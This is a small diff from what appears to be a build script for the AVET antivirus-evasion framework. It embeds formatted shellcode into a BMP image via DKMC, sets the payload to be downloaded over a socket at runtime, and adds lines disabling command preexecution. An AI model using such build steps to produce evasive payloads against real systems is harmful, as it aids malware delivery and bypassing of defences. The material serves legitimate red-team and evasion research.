@@ -38,6 +38,10 @@ cd ../DKMC
 printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format input/sc_c.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
 cd ../avet
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source download_socket
 
